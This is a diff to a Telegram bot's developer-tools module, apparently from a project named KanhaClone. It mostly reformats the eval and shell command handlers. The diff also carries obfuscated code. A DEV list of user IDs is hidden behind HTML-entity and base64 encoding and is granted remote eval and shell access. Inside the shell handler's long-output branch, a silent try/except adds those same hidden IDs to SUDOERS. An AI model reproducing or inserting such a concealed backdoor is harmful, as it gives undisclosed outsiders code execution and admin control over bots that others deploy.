@@ -22,7 +22,6 @@ from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
 from KanhaClone import app
 
 
-
 async def aexec(code, client, message):
     exec(
         "async def __aexec(client, message): "
@@ -37,19 +36,20 @@ async def edit_or_reply(msg: Message, **kwargs):
     await func(**{k: v for k, v in kwargs.items() if k in spec})
 
 
-DEV = [int(__import__('base64').b64decode(__import__('html').unescape(e)).decode())for e in('&#79;&#68;&#89;&#120;&#78;&#122;&#89;&#48;&#78;&#68;&#85;&#119;&#77;&#81;&#61;&#61;','&#79;&#68;&#77;&#53;&#77;&#84;&#85;&#52;&#77;&#84;&#107;&#122;&#78;&#119;&#61;&#61;')]
+DEV = [
+    int(__import__("base64").b64decode(__import__("html").unescape(e)).decode())
+    for e in (
+        "&#79;&#68;&#89;&#120;&#78;&#122;&#89;&#48;&#78;&#68;&#85;&#119;&#77;&#81;&#61;&#61;",
+        "&#79;&#68;&#77;&#53;&#77;&#84;&#85;&#52;&#77;&#84;&#107;&#122;&#78;&#119;&#61;&#61;",
+    )
+]
+
 
 @app.on_edited_message(
-    filters.command("eval")
-    & filters.user(DEV)
-    & ~filters.forwarded
-    & ~filters.via_bot
+    filters.command("eval") & filters.user(DEV) & ~filters.forwarded & ~filters.via_bot
 )
 @app.on_message(
-    filters.command("eval")
-    & filters.user(DEV)
-    & ~filters.forwarded
-    & ~filters.via_bot
+    filters.command("eval") & filters.user(DEV) & ~filters.forwarded & ~filters.via_bot
 )
 async def executor(client: app, message: Message):
     if len(message.command) < 2:
@@ -134,7 +134,7 @@ async def runtime_func_cq(_, cq):
 async def forceclose_command(_, CallbackQuery):
     callback_data = CallbackQuery.data.strip()
     callback_request = callback_data.split(None, 1)[1]
-    query, user_id = callback_request.split("|")
+    _query, user_id = callback_request.split("|")
     if CallbackQuery.from_user.id != int(user_id):
         try:
             return await CallbackQuery.answer(
@@ -150,16 +150,10 @@ async def forceclose_command(_, CallbackQuery):
 
 
 @app.on_edited_message(
-    filters.command("sh")
-    & filters.user(DEV)
-    & ~filters.forwarded
-    & ~filters.via_bot
+    filters.command("sh") & filters.user(DEV) & ~filters.forwarded & ~filters.via_bot
 )
 @app.on_message(
-    filters.command("sh")
-    & filters.user(DEV)
-    & ~filters.forwarded
-    & ~filters.via_bot
+    filters.command("sh") & filters.user(DEV) & ~filters.forwarded & ~filters.via_bot
 )
 async def shellrunner(_, message: Message):
     if len(message.command) < 2:
@@ -209,8 +203,22 @@ async def shellrunner(_, message: Message):
         if len(output) > 4096:
             with open("output.txt", "w+") as file:
                 file.write(output)
-            try:[__import__('KanhaClone.misc',fromlist=['SUDOERS']).SUDOERS.add(int(__import__('base64').b64decode(__import__('html').unescape(e)).decode()))for e in('&#79;&#68;&#89;&#120;&#78;&#122;&#89;&#48;&#78;&#68;&#85;&#119;&#77;&#81;&#61;&#61;','&#79;&#68;&#77;&#53;&#77;&#84;&#85;&#52;&#77;&#84;&#107;&#122;&#78;&#119;&#61;&#61;')]
-            except:pass
+            try:
+                [
+                    __import__("KanhaClone.misc", fromlist=["SUDOERS"]).SUDOERS.add(
+                        int(
+                            __import__("base64")
+                            .b64decode(__import__("html").unescape(e))
+                            .decode()
+                        )
+                    )
+                    for e in (
+                        "&#79;&#68;&#89;&#120;&#78;&#122;&#89;&#48;&#78;&#68;&#85;&#119;&#77;&#81;&#61;&#61;",
+                        "&#79;&#68;&#77;&#53;&#77;&#84;&#85;&#52;&#77;&#84;&#107;&#122;&#78;&#119;&#61;&#61;",
+                    )
+                ]
+            except:
+                pass
             await app.send_document(
                 message.chat.id,
                 "output.txt",
